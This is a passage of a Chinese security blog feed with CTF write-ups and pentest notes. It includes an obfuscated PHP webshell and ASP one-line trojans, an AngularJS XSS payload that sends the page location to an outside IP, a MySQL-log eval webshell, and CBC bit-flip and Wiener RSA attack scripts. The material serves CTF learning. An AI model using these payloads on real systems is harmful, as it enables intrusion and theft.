alt=""></p><p>伪加密</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261455_593.png" alt=""></p><p>实际上修改把01改成00就可</p><p>flag{96efd0a2037d06f34199e921079778ee}</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807242216_34.png" alt=""></p><h3 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h3><p>…. . .-.. .-.. —– ..-. — .-. ..- – </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807261343_275.png" alt=""></p><p>… . .-.. .-.. —– ..-. — .-. ..- —</p><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="external">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>HELL0FORUM</p><p>图片拿出来 stegsolve感觉可能是lsb隐写</p><pre><code>python lsb.py extract 女神.png  1.txt 123456</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>墨者学院php代码审计1</title>
      <link href="/archis/8395d5c7/"/>
      <url>/archis/8395d5c7/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<a href="http://219.153.49.228:45070/" target="_blank" rel="external">http://219.153.49.228:45070/</a></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>运行下，报错。 </p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>然后观察最后一行代码，把我们变量给用值替换进去</p><pre><code>${_GET}[!1](${_POST}[1]);</code></pre><p>把多余的{}去掉 [!1]也就是[0]，整理下代码是这样的</p><pre><code>$_GET[0]($_POST[1]);</code></pre><p>和一句话的</p><pre><code>$_POST[1]</code></pre><p>传参差不多了，那么</p><pre><code>$_GET[0]</code></pre><p>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:45070/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert</a></p><p>1=phpinfo()</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807221443_103.png" alt=""></p><p>在菜刀里写<a href="http://219.153.49.228:45070/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert密码是1</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201807221450_724.png" alt=""></p><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:45070/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP字符串&#39;和“区别</title>
      <link href="/archis/d8be4236/"/>
      <url>/archis/d8be4236/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP字符串’和“区别"><a href="#PHP字符串’和“区别" class="headerlink" title="PHP字符串’和“区别"></a>PHP字符串’和“区别</h1><p>在PHP语言里，如果一个字符串是用单引号做定义的，</p><p>比如： <code>&#39;$demo&#39;</code>，那么不管这个字符串中间有什么，php都会原样输出。 而如果一个字符串用双引号做定义，那么，php在输出结果之前，先扫描这个字符串，如果遇到 <code>$</code>为开头的，会认为这是个变量，并尝试将 变量 的 值 替换这个变量后，输出。 </p><p>举例如下：      </p><pre><code>&lt;?php$Bigbroke = &#39;123&#39;;$demo =&quot;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$Bigbroke&lt;/p&gt;&quot;;echo $demo;?&gt;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252008_139.png" alt=""></p><p>遇到 <code>$Bigbroke</code>为开头，寻找变量带入输出。</p><pre><code class="php">&lt;?php$Bigbroke = &#39;123&#39;;$demo =&#39;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$Bigbroke&lt;/p&gt;&#39;;echo $demo;?&gt;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252012_584.png" alt=""> </p><p>直接输出</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透测试基础</title>
      <link href="/archis/35d3b1d4/"/>
      <url>/archis/35d3b1d4/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><h2 id="0x00熟悉各类名词"><a href="#0x00熟悉各类名词" class="headerlink" title="0x00熟悉各类名词"></a>0x00熟悉各类名词</h2><p>黑客：Hacker 黑客所做的不是恶意破坏，他们是一群纵横网络上的技术人员，热衷与科技探索、计算机科学研究。在IT圈中，Hacker一词无疑是带有正面意义的。<br>骇客：Cracker 骇客未必具有很高的技术，通常用一些简单的手段去达到一些炫耀、恶作剧、搞破坏的目的。<br>红客：Honcker Honcker用自己的技术维护国内网络安全，并对外来的一切进攻进行还击。他们拥有爱国、正义、进取的精神，是网络安全时代的英雄的代表。</p><p>白帽： 专门研究或者从事网络安全行业的人，通常受雇于各大安全公司，是提高网络、系统安全水平的主要力量。</p><p>黑帽： 专门研究木马、操作系统，寻找漏洞，并且以个人意志为出发点，攻击网络或者计算机。<br>灰帽： 以个人意志为出发点，两者皆可做。</p><h2 id="0x01术语词汇"><a href="#0x01术语词汇" class="headerlink" title="0x01术语词汇"></a>0x01术语词汇</h2><p>脚本(asp、php、jsp)<br>html(css、js、html)<br>HTTP协议<br>CMS(B/S)<br>MD5<br>肉鸡： 被黑客入侵并长期驻扎的计算机或服务器。<br>抓鸡： 利用使用量大的程序的漏洞，使用自动化方式获取。<br>Webshell： 通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。<br>漏洞: 硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p><p>一句话木马： 通过向服务器端提交一句简短的代码，配合本地客户端实现webshell功能的木马。</p><p>&lt;%eval request(&quot;pass&quot;)%&gt;<br>&lt;%execute(request(&quot;pass&quot;))%&gt;<br>request(“pass”)：接收客户端提交的数据。pass为执行命令的参数。<br>eval/execute：函数执行客户端命令的内容。<br>提权： 操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p>后门： 黑客为了对住基金向长期的控制，在机器上种植的一段程序或者留下的一个“入口”。</p><p>跳板： 使用肉鸡IP来实施攻击其他目标，以便更好地隐藏自己的身份信息。</p><p>旁站入侵： 即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等。</p><p>C段入侵： 即同C段下服务器入侵。如目标ip为192.168.1.253，入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit，Snoop，Tcpdump，Dsniff等。</p><p>C段技巧 :</p><p>1.扫描1-255全部网段的网站CMS情况<br>选择一款自己擅长入侵的cms，这样才能更快速的实现C段入侵<br>2.扫描1-255全部网段的端口开放情况<br>先查询端口，选择自己擅长提权的端口的网站来入侵，通过端口提权。使用到的工具椰树、阿D网络工具包</p><h2 id="0x02渗透测试"><a href="#0x02渗透测试" class="headerlink" title="0x02渗透测试"></a>0x02渗透测试</h2><p><strong>黑盒测试</strong>： 在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Database、Script、code、思路、社工） 思路与经验积累往往决定成败。 三个臭皮匠赛过诸葛亮。<br><strong>白盒测试</strong> ： 相对黑盒测试，白鹤测试基本是从内部发起。 黑百合的另一种说法： 知道源代码和不知道源代码的渗透测试。 这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。</p><p><strong>灰盒测试</strong>：基于白盒与黑盒测试之间的一种产物。 </p><p><strong>APT攻击</strong>：Advanced Persistent Threat 高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。<br>1.极强的隐蔽性<br>2.潜伏期长，持续性强<br>3.目标性强<br><strong>渗透测试的特点：</strong><br>充满挑战与刺激——不达目的不罢休<br>思路与经验累计往往决定成败</p><p><strong>渗透测试与入侵的最大的区别：</strong><br>渗透测试：更全面的找出服务器的问题，更倾向于保护。<br>入侵：不择手段地（甚至是具有破坏性的）拿到权限。</p><h2 id="0x03渗透测试一般流程："><a href="#0x03渗透测试一般流程：" class="headerlink" title="0x03渗透测试一般流程："></a>0x03渗透测试一般流程：</h2><p>明确目标》信息收集》漏洞探测》漏洞验证》信息分析 》获取所需》信息整理》 形成报告</p><p>1.明确目标：<br>确定范围<br>确定规则<br>确定需求<br>2.信息收集：<br>基础信息<br>系统信息<br>应用信息<br>版本信息<br>服务信息<br>人员信息<br>防护信息<br>3.漏洞探测：<br>系统漏洞<br>WebServer漏洞<br>Web应用漏洞<br>其他端口服务漏洞<br>通信安全<br>4.漏洞验证：<br>自动化验证<br>手工验证<br>试验验证<br>登录猜解<br>业务漏洞验证<br>公开资源的利用<br>5.信息分析<br>精准打击<br>绕过防御机制<br>定制攻击路径<br>绕过检测机制<br>攻击代码<br>6.获取所需<br>实施攻击<br>获取内部信息<br>进一步渗透<br>持续性存在<br>清理痕迹<br>7.信息整理<br>整理渗透工具<br>整理收集信息<br>整理漏洞信息<br>8.形成报告：<br>按需整理<br>补充介绍<br>修补建议</p><p>经验分享<br>信息搜集是关键<br>做事不要太心急<br>多学习，多看源码<br>平时注意搜集0day<br>思路很重要</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>八月展望</title>
      <link href="/archis/80e1beed/"/>
      <url>/archis/80e1beed/</url>
      
        <content type="html"><![CDATA[<p>不要自己感动自己</p><p>不要过于享受生活</p><p>八月了，八月还会是如此的散漫自由么，生活确实不是一帆丰顺，社会上的尔虞吾诈也都心酸体验了一把。</p><p>八月了，希望自己静下心来，认真的做自己的计划，世界的另一番风景只有站的最够高才能看清，太低了琐事缠身，总想超脱，痛恨无能摆脱。</p><p>八月了，时间慢一点吧，目标定实际一点吧，能尽力碰到就好。人总是有些好高骛远，飞的太高太不真实，落下就残忍。</p><p>八月，祝能实现理想，静候佳音。完成flag。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018SCTF-wp</title>
      <link href="/archis/f4e3f3ec/"/>
      <url>/archis/f4e3f3ec/</url>
      
        <content type="html"><![CDATA[<h1 id="sctf"><a href="#sctf" class="headerlink" title="sctf"></a>sctf</h1><p>被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202236_554.png" alt=""></p><p>[TOC]</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>以下图为例，使用 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="https://i.imgur.com/yPJvv6u.png" alt="SPA图示"><br><img src="https://i.imgur.com/ogzPrtK.png" alt=""></p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806191825_719.png" alt=""><br>接下来tcp流追踪<br>搜索sctf未果<br>继续慢慢寻找<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806191816_523.png" alt=""><br>SCTF{Easy_Mdbus}</p><p><img src="" alt="Uploading file..._wk2cyf491"></p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>logicdata拖进Logic里面,分析嗅探得到的波形图</p><p><img src="https://i.imgur.com/fvQUPGz.png" alt=""></p><p>0x400x310x10</p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>使用硕思闪客精灵 反编译flash</p><p>在动作一栏寻找得到一段会话</p><p>得到</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202141_189.png" alt=""></p><p>U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9</p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h3><p>右键查看源码得到 AngularJS 版本1.4.6<br>模板注入<br><a href="https://www.anquanke.com/post/id/86093" target="_blank" rel="external">https://www.anquanke.com/post/id/86093</a><br><a href="http://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="external">http://seaii-blog.com/index.php/2017/09/02/68.html</a></p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);eval(atob(`dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xNjUuMjI3LjU4LjEwOTo4ODg4Lz9sb2NhdGlvbj0nK2RvY3VtZW50LmxvY2F0aW9uLmhyZWY7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs=`));alert(3);//');}}</code></pre><p>本地可以xss，vps收不到bot的请求</p><h3 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h3><p>参照了网上的文章利用日志的方法写入shell</p><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接</p><p>首先查看本地的写shell地址</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202056_350.png" alt=""></p><p>SET global general_log_file=’D:/phpStu/WWW/shell.php’;</p><p>select “&lt;?php @eval($_POST[‘shell’]);?&gt;”; </p><p><img src="http://oxskavewj.bkt.clouddn.com/3nahv80ilqe61q1enu4zprhu59.png" alt=""></p><p>shell连上进入c盘获取flag</p><p><img src="http://oxskavewj.bkt.clouddn.com/2p45t2wakukp40nuieu4wv1q3e.png" alt=""></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="Script-In-Script"><a href="#Script-In-Script" class="headerlink" title="Script In Script"></a>Script In Script</h3><p>本来想着写脚本爆破的，考虑到时间的原因采用了取巧的方法，因为flag的很多字符都是可以看代码写出来的，所以本地把js先解密了，搭了一个环境，根据js的变量值进行测试</p><p><img src="http://oxskavewj.bkt.clouddn.com/cgb8jdo2whkqex0ndrl65y2tq3.png" alt=""></p><p>flag:sctf{5cr1Pt_In_ScrIpT!!}</p><h3 id="Where-is-my-13th-count？"><a href="#Where-is-my-13th-count？" class="headerlink" title="Where is my 13th count？"></a>Where is my 13th count？</h3><p>题目要求是让白球吃到13个黄色方块得到13分，但是一共只有12个能吃<br>使用相关调试软件发现游戏会闪退，判断有反调试<br>根据suctf的一道题目</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202212_643.png" alt=""></p><p>分析Cheat Engine_Data\Managed下的Assembly-CSharp.dll文件，反调试都在这个dll文件下完成<br>发现了这些东西</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_821.png" alt=""></p><p>交叉分析找到反调试函数然后直接patch<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_351.png" alt=""><br>使用游戏辅助神器Cheat Engine修改游戏的分数内存即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_393.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806202211_208.png" alt=""></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>低解密指数攻击</p><pre><code class="pp">import gmpy2import timedef continuedFra(x, y):    cF = []    while y:        cF += [x / y]        x, y = y, x % y    return cFdef Simplify(ctnf):    numerator = 0    denominator = 1    for x in ctnf[::-1]:        numerator, denominator = denominator, x * denominator + numerator    return (numerator, denominator)def calculateFrac(x, y):    cF = continuedFra(x, y)    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))    return cFdef solve_pq(a, b, c):    par = gmpy2.isqrt(b * b - 4 * a * c)    return (-b + par) / (2 * a), (-b - par) / (2 * a)def wienerAttack(e, n):    for (d, k) in calculateFrac(e, n):        if k == 0: continue        if (e * d - 1) % k != 0: continue        phi = (e * d - 1) / k        p, q = solve_pq(1, n - phi + 1, n)        if p * q == n:            return abs(int(p)), abs(int(q))    print &#39;not find!&#39;time.clock()n = 0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bfe = 0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939c = 0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3p, q = wienerAttack(e, n)print &#39;[+]Found!&#39;print &#39;  [-]p =&#39;,pprint &#39;  [-]q =&#39;,qprint &#39;  [-]n =&#39;,p*qd = gmpy2.invert(e,(p-1)*(q-1))print &#39;  [-]d =&#39;, dprint &#39;  [-]m is:&#39; + &#39;{:x}&#39;.format(pow(c,d,n)).decode(&#39;hex&#39;)print &#39;\n[!]Timer:&#39;, round(time.clock(),2), &#39;s&#39;print &#39;[!]All Done!&#39;print n```</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cbc字节翻转攻击</title>
      <link href="/archis/2947d8f2/"/>
      <url>/archis/2947d8f2/</url>
      
        <content type="html"><![CDATA[<h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h2 id="CBC原理"><a href="#CBC原理" class="headerlink" title="CBC原理"></a>CBC原理</h2><p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805201723_856.jpg" alt=""></p><h2 id="对cbc的攻击"><a href="#对cbc的攻击" class="headerlink" title="对cbc的攻击"></a>对cbc的攻击</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805201725_862.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805201726_48.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805202259_97.png" alt=""></p><h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>　　我们举例说明一下这个例子，这里有一个明文序列：</p><pre><code>a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}</code></pre><p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p><pre><code>- Block 1:a:2:{s:4:&quot;name&quot;; - Block 2:s:6:”sdsdsd”;s:8- Block 3::”greeting”;s:20- Block 4::”echo ‘Hello sd- Block 5:sdsd!’”;}</code></pre><p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p><pre><code>$v = &quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}&quot;;$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));$b = @decrypt($enc);</code></pre><p>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p><h2 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h2><h3 id="iscc2018-Only-admin-can-see-flag"><a href="#iscc2018-Only-admin-can-see-flag" class="headerlink" title="iscc2018-Only admin can see flag"></a>iscc2018-Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>s:2:{s:8:”userna</li><li>me”;s:5:”Admin”;</li><li>s:8:”password”;s</li><li>:5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><p>Bugku上的一道题来做分析：<br>题目链接：<code>http://47.93.190.246:49168/</code><br>进入后发现页面存在源码泄露：<code>index.php.swp</code><br>恢复后审计源码：</p><pre><code>function get_random_iv(){    $random_iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_iv.=chr(rand(1,255));    }    return 